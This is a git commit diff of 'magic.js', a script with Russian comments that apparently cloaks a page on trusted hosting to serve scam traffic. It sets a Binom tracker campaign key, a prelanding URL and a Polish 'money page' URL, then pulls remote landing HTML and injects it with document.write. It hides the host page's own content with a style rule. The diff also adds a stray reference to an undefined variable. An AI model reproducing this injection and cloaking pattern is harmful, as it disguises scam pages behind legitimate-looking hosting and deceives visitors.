6a195d4e28d8f0342a02067e23bf4e731f7af6f3
Denis8854 <37094139+Denis8854@users.noreply.github.com>
2020-02-19 19:55:39 +0200

    Update magic.js

--- magic.js
+++ magic.js
@@ -1,5 +1,10 @@
 var binomCampaingKey = 's15yun0z67b7t9btickt'; /*GitHub Test, id:158. Key кампании в Binom. Не ID! Узнать key нужной кампании можно в настройках этой кампании. Вот здесь - http://prntscr.com/qua54o  */
+var landingUrl = 'https://serd.site/landing/s_p_m/poland/blog-powodzenia.php'; /*Адрес преленда, который необходимо подгрузить*/
+var gitHubId = 'findyourways'; /*ID созданного в первой части гайда Google-сайта. Только ID, не вся ссылка!*/
+var moneyPageUrl = 'https://lo.blog-powodzenia.biz/automatycznysystem.php/'; /*Адрес манипейдж, который будет подставлен в ссылки на преленде*/
 var landingLoadingId = '7m3fx3qa9r1cgejf2iox';
+
+console.log(x);
 
 /* БОЛЬШЕ НИЧЕГО НЕ МЕНЯТЬ!*/
 
@@ -25,7 +30,9 @@ xhrLand.send();
 
 if (xhrLand.status == 200) {
   landingCode = xhrLand.responseText;
-} 
+}
+
+document.write("<style>#swrap{display:none;}</style>")
 
 document.write(landingCode);
 
